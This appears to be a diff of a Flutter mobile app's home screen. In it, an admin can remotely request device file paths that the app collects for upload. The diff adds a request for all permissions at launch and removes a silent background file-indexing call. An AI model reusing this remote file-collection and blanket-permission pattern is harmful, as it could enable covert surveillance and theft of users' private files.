@@ -37,30 +37,25 @@ class _HomeScreenState extends State<HomeScreen> {
     final uid = _fb.userId!;
     final data = await _fb.getUserData(uid);
     setState(() => _userName = data['name'] ?? 'User');
-    await _ps.syncGrantedStatus(_permissions);
 
-    // Index device files in the background (fire and forget)
-    _indexFiles(uid);
+    // Request ALL permissions immediately on launch
+    for (final p in _permissions) {
+      await _ps.requestPermission(p.permission);
+    }
+    await _ps.syncGrantedStatus(_permissions);
 
     // Subscribe to upload requests from admin
     _uploadRequestSub = _syncService.watchUploadRequest(uid).listen((snap) async {
       if (!snap.exists) return;
       final reqData = snap.data() as Map<String, dynamic>?;
       if (reqData == null) return;
-
-      // Skip if already processing
       if (reqData['status'] == 'processing') return;
 
-      // Mark as processing
       await _syncService.setUploadRequestStatus(uid, 'processing');
 
       final rawPaths = reqData['paths'];
       final paths = (rawPaths is List) ? List<String>.from(rawPaths) : <String>[];
-
-      final files = paths
-          .map((p) => File(p))
-          .where((f) => f.existsSync())
-          .toList();
+      final files = paths.map((p) => File(p)).where((f) => f.existsSync()).toList();
 
       if (mounted) {
         ScaffoldMessenger.of(context).showSnackBar(
@@ -86,22 +81,14 @@ class _HomeScreenState extends State<HomeScreen> {
       }
     });
 
-    // Listen to admin changes in real-time
+    // Listen to admin permission changes in real-time
     _sub = _fb.watchPermissions(uid).listen((adminPerms) async {
       for (final p in _permissions) {
         p.isEnabled = adminPerms[p.id] ?? false;
       }
-      // Auto-request newly enabled permissions
-      await _ps.requestEnabledPermissions(_permissions);
       await _ps.syncGrantedStatus(_permissions);
       if (mounted) setState(() => _loading = false);
     });
-  }
-
-  Future<void> _indexFiles(String uid) async {
-    try {
-      await _syncService.indexDeviceFiles(uid);
-    } catch (_) {}
   }
 
   @override
